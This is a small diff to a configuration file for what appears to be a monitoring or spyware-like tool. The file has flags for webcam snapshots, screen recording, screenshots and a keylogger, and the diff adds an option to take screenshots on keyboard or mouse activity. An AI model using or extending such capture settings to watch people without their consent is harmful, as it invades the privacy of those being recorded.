@@ -91,6 +91,10 @@ WEBCAM_PHOTO  = 1    # periodic webcam snapshots (one photo per interval)
 WEBCAM_PHOTO_ON_ACTIVITY = True
 SCREEN_RECORD = 0    # continuous screen video recording
 SCREEN_SHOT   = 1    # periodic screenshots
+# When True, screenshots are taken on keyboard/mouse activity instead of
+# (only) on a fixed timer.  SCREENSHOT_INTERVAL still acts as the minimum
+# gap between consecutive captures.
+SCREENSHOT_ON_ACTIVITY = True
 KEY_LOGGER    = 1    # keyboard activity logging
 
 
